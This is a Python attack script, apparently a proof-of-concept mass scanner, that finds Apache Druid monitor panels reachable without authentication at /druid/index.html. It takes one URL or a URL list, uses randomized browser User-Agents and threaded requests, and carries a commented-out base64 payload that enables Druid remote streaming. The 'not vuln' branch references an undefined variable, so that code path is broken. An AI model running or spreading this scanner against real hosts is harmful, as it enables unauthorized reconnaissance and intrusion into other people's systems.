import requests
import urllib3
import sys
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

#poc
def check_vuln(url):
	url = parse.urlparse(url)
	url2=url.scheme + '://' + url.netloc + '/druid/index.html'
	headers = {
		'User-Agent': get_ua()
	}
	# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
	try:
		res2 = requests.get(url2,headers=headers,timeout=5,verify=False)
		if res2.status_code==200 and "Druid Stat Index" in res2.text and "DruidVersion" in res2.text:
			print("\033[32m[+]%s is vuln\033[0m" %url2)
		else:
			print("\033[31m[-]%s is not vuln\033[0m" %url1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url2)

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		works.append(i)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	 _____ _   _ _____       _____  _____  _____  __       _____    ___ _____    ___  _____ 
	/  __ \ | | |  ___|     / __  \|  _  |/ __  \/  |     |____ |  /   |  _  |  /   ||  ___|
	| /  \/ | | | |__ ______`' / /'| |/' |`' / /'`| |______   / / / /| | |/' | / /| ||___ \ 
	| |   | | | |  __|______| / /  |  /| |  / /   | |______|  \ \/ /_| |  /| |/ /_| |    \ \
	| \__/\ \_/ / |___      ./ /___\ |_/ /./ /____| |_    .___/ /\___  \ |_/ /\___  |/\__/ /
	 \____/\___/\____/      \_____/ \___/ \_____/\___/    \____/     |_/\___/     |_/\____/ 
	                                                                                        
	                                                                                        
                              	 				druid_monitor_unauth poc By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='druid_monitor_unauth exp By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	print('[*]任务开始...')
	start=time()
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))

